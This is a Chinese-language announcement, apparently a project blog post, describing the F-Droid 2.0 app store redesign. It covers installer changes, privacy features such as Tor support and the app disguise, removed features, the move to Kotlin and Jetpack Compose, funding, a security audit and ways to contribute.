筛选器可以根据多个条件进行组合叠加，例如应用分类、设备兼容性或“反特性”（anti-features）。例如，您可以选择只查看与您的设备兼容的“动作游戏”，并排除掉依赖非自由网络服务的应用。

为了帮助用户发现这些以及其他高级功能，F-Droid 2.0 在整个应用中引入了新手引导页面。应用没有将功能隐藏在复杂的设置菜单深处，而是提供情境化的引导，帮助新手与老用户都能充分挖掘 F-Droid 的潜力。

长期以来，受制于 Android 系统的限制，点击安装或更新的体验一直差强人意。如今，很大程度上得益于欧盟《数字市场法案》（DMA）的推动以及全球范围内的反垄断举措，Android 开始为所有应用商店提供比以往更加流畅、更加自动化的安装与更新方案选项。F-Droid 2.0 在运用这些新特性方面开展了开创性的工作。这使得无论是预装在操作系统中、还是用户自行安装的 F-Droid，都能使用统一的安装器。该统一安装器利用了全新的预批准（pre-approval）API，在支持的设备上，用户在决定安装应用后即可立即确认，而无需等待应用下载完成后再行确认。这使得 F-Droid 在官方 Android 设备上的安装体验与内置应用商店看齐。

如此大刀阔斧的重构，意味着必须慎重决定哪些内容应当保留在新应用中、哪些可以换种方式处理、哪些则不再适合沿用。作为让 F-Droid 2.0 更精简且更易维护的一部分，一些大家熟悉的功能被更改、迁移或移除，同时核心功能以及用户依赖的特性均得到了完整保留。

F-Droid 2.0 现在默认会自动获取并安装应用更新。如果您倾向于拥有更多控制权也不必担心，您原有的偏好设置仍会受到完全尊重。

部分用户可能会想念通过“下拉刷新”手势来检查所有仓库更新的操作。在 F-Droid 2.0 中，下拉手势已专用于页面滚动。之所以能做此改变，是因为应用现在能够在后台自动检查更新。相较于保留一个大家习惯的操作，我们更倾向于从根本上消除该操作的必要性。最好的刷新按钮，就是您永远不需要按下的那个。

F-Droid 让您可以完全掌控何时下载何种内容。这有助于满足全球各类用户截然不同的需求。许多用户能享受到廉价的移动流量，但对另一些人而言移动数据费用却极其昂贵；部分用户对隐私保护有极高要求，需要严格掌控网络流量；还有一些用户使用的是配置有限的设备，后台更新容易导致系统卡顿。控制这些行为的设置项均经过了重构，让您根据自身需求定制 F-Droid 变得更加直观。

还有一部分 F-Droid 用户身处的环境较为特殊，仅仅是安装某些应用甚至单纯使用 F-Droid 都有可能招致不必要的注意。为了向这部分用户提供支持，F-Droid 长期以来都内置了一系列隐私与安全功能，旨在全方位保护用户及其数据安全。

Tor 是一项关键的隐私工具，F-Droid 长期以来一直支持将 Tor 用于所有网络连接，并支持在软件仓库和镜像中使用 Tor 洋葱服务（Tor Onion Services）。自最初集成 Tor 支持以来，Tor 在 Android 上的整合生态已经发生了相当大的变化。如今出现了 TorVPN、Orbot、TorServices 等工具。我们借此机会简化了设置，并移除了已不再可靠的自动检测功能。如果您之前启用了“使用 Tor”，该设置将被迁移至通用代理设置中。展望未来，Tor VPN 是获得便捷 Tor 支持的推荐方式，而代理设置仍可供需要手动控制的用户使用。

另一个关键部分是“应急响应”（panic）功能集，它允许用户在紧急情况下快速从设备中清除某些特定类型的敏感信息。F-Droid 2.0 依然保留了这些功能，它们仍是为具有更高安全需求的用户提供支持的重要组成部分。

值得注意的是，F-Droid 的应用伪装隐藏功能已进行了简化，以便让用户对其所能获得的保护程度有一个准确的预期。F-Droid 是最早开始提供应用伪装隐藏功能以保护用户隐私的应用之一，其中包括将 F-Droid 应用伪装成简易计算器应用的“应急”功能。这一简易功能曾受到许多用户的青睐，此后 Orbot、TorVPN、Signal 等应用也陆续添加了此类伪装功能。随着时间的推移，在广泛使用的应用中逐渐形成了一套标准设计，我们在新版本中也采用了这一设计。该功能旨在让用户更好地理解伪装的局限性。现在的伪装不再是外观和功能都表现为一个简单的计算器，而仅改变应用图标和名称，不涉及其他任何内容。这能让用户清楚地意识到，F-Droid 应用仍会显示在系统的“应用”设置列表中，并且在进行取证检查时依然会被检测出来。希望这一变化能让用户更容易理解该功能的局限性，同时在需要时仍能加以利用。

目前尚未回归的一项功能是：在响应如 Ripple 这类应急触发器应用时，自动卸载并清除应用的能力。我们深知部分用户出于隐私和个人安全原因依赖该功能，也明白它不仅仅是一项可用性功能。然而，维护这项功能需要高度专业化的开发工作，鉴于其用户群体较小，我们认为不应再让它阻碍众多其他重要改进的推进。

应用清除依然是一项重要功能。我们特别欢迎使用该功能的用户提供反馈，帮助我们了解它是如何以及在何时被使用的，以便我们在持续改进 F-Droid 2.0 的过程中评估最佳的后续方案。依赖当前应用清除实现方式的用户，可以在我们评估重新引入该功能期间，选择暂缓更新至 F-Droid 2.0。

F-Droid 旨在集成到任何版本的 Android 或 AOSP 中，正如我们在 CalyxOS、emteriaOS、iodéOS、Lineage-for-microG 和 ShiftOS 中所看到的那样。各个操作系统都可以通过“附加仓库”（additional repos）机制默认包含其专有仓库。如果您使用的是这些操作系统之一，这些仓库将显示在您的“软件仓库”概览中。有关具体变更的更多信息，请参阅相关博文。

此外，2.0 版本目前不支持 F-Droid 特权扩展（FPE）。这意味着即便安装了 FPE，F-Droid 2.0 也不会调用它。本次重构的重点是全面支持 Android 的“会话”（session）安装器。这使得 F-Droid 能够在任何较新的 Android 版本上运行后台更新，而无需依赖 FPE。与这里提到的所有变更一样，我们非常欢迎大家提出反馈。

虽然 F-Droid 2.0 的许多改进显而易见，但一些最重要的变革发生在底层。

本次重构中的所有新代码均遵循现代 Android 代码标准和设计规范。这为我们提供了一个更易于维护、测试，且在未来更容易扩展新功能的基本代码库。

重写的目标之一是降低新贡献者的参与门槛。在过去的十年中，Android 开发发生了翻天覆地的变化，F-Droid 2.0 现已改用 Kotlin 构建——该语言已成为现代 Android 开发的标准语言。这使得熟悉当今 Android 生态系统的开发者能够更轻松地为该项目做出贡献。

全新的用户界面采用 Jetpack Compose 构建，这是 Android 应用程序的标准开发工具包。除了简化开发流程外，这还帮助我们将 F-Droid 与 Material Design（贯穿 Android 系统的设计语言）更紧密地保持一致。因此，F-Droid 在保持自身独特标识和价值观的同时，给 Android 用户带来了更加熟悉的使用体验。

最重要的是，这些变革为 F-Droid 未来十年的发展奠定了基础。通过减轻维护负担并降低贡献门槛，我们可以将更多时间用于改善用户体验，减少应对技术债务的精力。一些新工具还依赖于 Android 系统本身的修复补丁，其中一项修复是在 Android 7 中引入的，这迫使我们放弃了对 Android 6 的支持。与往常一样，旧版 F-Droid 将继续在较旧的 Android 版本上运行。

F-Droid 2.0 是我们历史上规模最大、最雄心勃勃的项目之一。将其变为现实所需要的远不止软件开发本身。它涉及用户研究、设计、测试、文档编写、社区反馈、质量保证、大量新代码编写、安全审计，以及关于 F-Droid 未来十年应如何演进的无数次讨论。

这项工作的顺利完成离不开众多机构和个人的大力支持。Torsten Grote 在新应用上的开发工作由 NLnet 基金会通过 Mobifree 基金提供资助。开放技术基金（Open Technology Fund）的用户体验与探索实验室（UX & Discovery Lab）支持了用户研究和设计工作，并引入了 Ura Design 来协助进行用户测试、编写用户故事以及完善我们的人机交互指南。

其他支持来自开放技术基金的自由和开源软件（FOSS）可持续发展基金、NGI、Mobifree 以及 Calyx Institute，他们的赞助有助于支持 F-Droid 生态系统的持续维护和长期可持续发展。

作为这项工作的一部分，开放技术基金的安全实验室联合 Convocation 对 F-Droid 2.0 进行了独立的安全审查。我们分析并解决了与新应用相关的所有审查发现，以确保该版本符合用户所期望的高安全标准。在审计报告获准公开发布后，我们期待与大家分享完整的审计报告。

同样重要的是，F-Droid 2.0 凝聚了众多志愿者的心血。在整个重新设计过程中，社区成员贡献了代码、测试、错误报告、设计反馈、翻译、文档、用户体验讨论以及数不胜数的想法。无论是长期的贡献者，还是首次参与贡献的新朋友，都共同促成了最终成果的诞生。

最后，如果没有大家的支持，这项工作不可能完成。捐款有助于资助许多拨款通常无法覆盖、虽不显眼但至关重要的活动，包括社区管理、积压议题处理、质量保证、发布管理以及项目协调。在特定的资助项目结束后很长一段时间内，这些贡献都有助于保持 F-Droid 的健康运作。

F-Droid 2.0 代表着一个重要的里程碑，但这并不是故事的终点。重构这款应用为我们打下了更坚实的基础，但前方仍有大量工作要做。

随着新版本推送到更多用户手中，我们期望能从实际使用中吸取大量经验。从最早的设计讨论到众多的 Alpha 和 RC 版本，社区的反馈塑造了 F-Droid 2.0，并且它将继续指引未来的改进。有些想法未能进入最初的正式版本，而另一些功能则随着我们收集反馈并完善设计仍在不断演进。

在接下来的几个月里，我们将继续改进性能、无障碍功能、应用发现以及整体易用性。我们还将持续倾听用户的声音，关注大家对新体验的适应情况，并帮助我们寻找进一步改进的机会。

就像之前的每一个 F-Droid 主要版本一样，2.0 版本不是终点，而是下一篇章的开始。

一个仍在持续演进的领域是“附近分享”（Nearby），这项功能允许用户在不依赖中央服务器的情况下，直接在设备之间共享应用。

F-Droid 2.0 更广泛的重新设计让我们有机会从头开始重新构思“附近分享”。我们一直在基于改进后的连接方式开发新的实现方案，这将使应用共享更加可靠且易于使用。

这项工作尚未完全准备好纳入 F-Droid 2.0 的初始发布中，但开发工作正在积极推进，基础架构已经就绪。如果“附近分享”对你很重要，现在正是参与进来的绝佳时机。社区的反馈和测试有助于在该功能推向更广泛的受众之前，塑造其下一代形态。

F-Droid 2.0 凝聚了来自世界各地的开发者、设计师、测试人员、翻译人员、捐赠者和社区成员数千小时的心血。既然它已经来到用户手中，我们非常希望得到大家的帮助，让它变得更好。

如果你收到了更新，请花些时间体验全新的设计，并告诉我们你的想法。无论你是发现了错误、有了改进的想法，还是只想告诉我们哪些功能体验良好，你的反馈都有助于指引未来的开发。

如果你想更深入地参与其中，有许多种贡献方式。

你可以协助测试即将推出的新功能、完善翻译和文档、审核议题、贡献代码，或者加入关于项目未来的讨论。我们随时欢迎新的贡献者。

如果你有能力，也请考虑在经济上支持 F-Droid。通过 Liberapay 或 OpenCollective 进行的捐款，有助于资助各大版本之间维持项目健康运作的持续性工作，涵盖从基础设施和质量保证到社区支持及项目协调的方方面面。

F-Droid 2.0 是一个重要的里程碑，但工作仍在继续。感谢大家帮助我们为 Android 构建一个自由、开放且可持续的应用生态系统。
